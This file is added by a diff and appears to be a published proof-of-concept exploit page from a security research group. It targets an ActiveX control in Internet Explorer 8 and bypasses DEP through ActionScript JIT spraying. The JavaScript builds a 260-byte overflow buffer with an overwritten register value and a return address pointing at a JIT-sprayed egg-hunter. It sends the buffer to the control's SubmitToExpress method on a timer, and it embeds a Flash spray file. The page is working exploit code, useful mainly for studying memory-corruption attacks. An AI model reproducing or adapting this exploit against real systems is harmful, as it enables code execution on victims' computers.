@@ -1,0 +1,74 @@
+<HTML>
+	<HEAD>
+	<TITLE>"DSecRG": ActiveX IE8-permanent-DEP Sploit [ActionScript JitSpray]</TITLE>
+	
+	<SCRIPT>
+	
+	</SCRIPT>
+	
+	</HEAD>
+	
+	<OBJECT id="vuln" classid="clsid:68AC0D5F-0424-11D5-822F-00C04F6BA8D9"></OBJECT>
+	
+	<BODY>
+	
+	
+	<!--
+	
+//	egg-hunter example	
+//  By Alexey Sintsov
+//	dookie@inbox.ru
+//	a.sintsov@dsec.ru
+//
+//	DSecRG - Digital Security Research Group [dsecrg.com]
+//
+//	
+//	DSecRG - Digital Security Research Group [dsecrg.com]
+
+	-->
+	
+	<SCRIPT>
+	
+
+	function exploit(){
+		var bf=unescape("%63"); //сссссс...260...cccccc
+		var buf="";	
+		
+		
+		while (buf.length<260) buf=buf+bf;
+		
+		buf+=unescape("%0a%0a%12%12"); 			//ESI -- points on NULLS
+		buf+="ffff"+unescape("%01%01%12%12");	// Return address = 0x12120101 - JIT egg-hunter
+			
+		
+		alert('Try me, brave ehh-hunter :-)');
+		vuln.SubmitToExpress(buf);
+      	
+	}
+	
+
+	setTimeout('exploit()',15000);
+
+	</SCRIPT>
+
+<center>	
+	<object classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000"
+             id="Loadzz1" width="320" height="300"
+             codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab">
+         <param name="movie" value="jit-spray.swf" />
+         <param name="quality" value="high" />
+         <param name="bgcolor" value="#c11c17" />
+         <param name="allowScriptAccess" value="always" />
+		 <param name="allowNetworking" value="all" />
+         <embed src="jit-spray.swf" quality="high" bgcolor="#c11c17"
+             width="320" height="300" name="Loadzz1" align="middle"
+             play="true" loop="false" quality="high" allowScriptAccess="always" 
+			 allowNetworking="all"
+             type="application/x-shockwave-flash"
+             pluginspage="http://www.macromedia.com/go/getflashplayer">
+         </embed>
+     </object>
+</center>
+		
+</BODY>
+</HTML>
